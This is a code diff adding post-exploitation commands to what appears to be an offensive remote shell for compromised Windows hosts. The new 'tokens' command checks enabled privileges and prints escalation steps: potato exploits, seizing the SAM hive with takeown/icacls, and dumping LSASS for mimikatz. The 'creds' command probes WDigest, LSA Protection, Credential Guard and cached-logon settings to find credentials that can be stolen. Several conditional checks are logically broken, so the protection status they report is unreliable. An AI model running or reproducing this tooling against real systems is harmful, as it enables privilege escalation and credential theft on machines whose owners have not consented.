@@ -152,6 +152,8 @@ class RemoteShell(cmd.Cmd):
  --------------------------------------------------------------------------------------------
   unattend                   - find all unattended files (potential base64 credentials)
   regrip                     - save sam, security, system to target pwd
+  creds                      - enumerate LSA Protection, WDigest, Credential Guard, Cached 
+                               logon count 
  --------------------------------------------------------------------------------------------
  + Tunneling                                                                               + 
  --------------------------------------------------------------------------------------------
@@ -355,6 +357,61 @@ class RemoteShell(cmd.Cmd):
                 self.__outputBuffer = ''
         except:
             pass
+
+    def do_tokens(self, s):
+        self.execute_remote('whoami /priv | findstr /i "Enabled"')
+        if len(self.__outputBuffer.strip('\r\n')) > 0: 
+            if "SeImpersonatePrivilege" in self.__outputBuffer:
+                print('SeImpersonate Enabled: \n   juicy-potato\n   RougeWinRM\n   SweetPotato\n   PrintSpoofer')
+        #dont clear the ouput buffer until you are done with your checks 
+            if "SeBackupPrivilege" in self.__outputBuffer:
+                print('SeBackupPrivilege Enabled: \n   https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1\n   https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug\n   https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec')
+            if "SeTakeOwnershipPrivilege" in self.__outputBuffer:
+                print('SeTakeOwnershipPrivilege Enabled: \n   takeown /f "C:\windows\system32\config\SAM"\n   icacls "C:\windows\system32\config\SAM" /grant <your_username>:F')
+            if "SeDebugPrivilege" in self.__outputBuffer:
+                print("SeDebugPrivilege Enabled: \n   Procdump.exe on LSASS.exe, use mimikatz")
+        else:
+            logging.info("No Valuable Tokens Found")
+        self.__outputBuffer = ''
+
+    def do_creds(self, s):
+        #WDigest 
+        self.execute_remote("reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential")
+        if "0x0" in self.__outputBuffer or "0" in self.__outputBuffer or "ERROR" in self.__outputBuffer:
+            logging.info("WDigest is not enabled")
+            self.__outputBuffer = ''
+        else:
+            logging.info("WDigest might be enabled --> LSASS clear text creds")
+            if len(self.__outputBuffer.strip('\r\n')) > 0: 
+                print(self.__outputBuffer)
+                self.__outputBuffer = ''
+        self.execute_remote("reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL")
+        if "0x1" in self.__outputBuffer or "1" in self.__outputBuffer:
+            logging.info("LSA Protection Enabled")
+            self.__outputBuffer = ''
+        else:
+            logging.info("LSA Protection not enabled")
+            self.__outputBuffer = ''
+        self.execute_remote("reg query HKLM\System\CurrentControlSet\Control\LSA /v LsaCfgFlags")
+        if "0x0" in self.__outputBuffer or "ERROR" in self.__outputBuffer:
+            logging.info("Credential Guard Probably not enabled")
+            self.__outputBuffer = ''
+        elif "0x1" or "1" in self.__outputBuffer:
+            logging.info("Credential Guard active with UEFI lock")
+            self.__outputBuffer = ''
+        elif "0x2" or "2" in self.__outputBuffer:
+            logging.info("Credential Guard enabled without UEFI lock")
+            self.__outputBuffer = ''
+        else:
+            logging.info("Error: Couldnt enumerate Credential Guard")
+        self.execute_remote('reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT')
+        if "10" in self.__outputBuffer:
+            logging.info("Default of 10 cached logons")
+        else:
+            logging.info("Cached Logon Credential Amount")
+            if len(self.__outputBuffer.strip('\r\n')) > 0: 
+                print(self.__outputBuffer)
+                self.__outputBuffer = '' 
 
     def do_vmcheck(self, s):
         try:
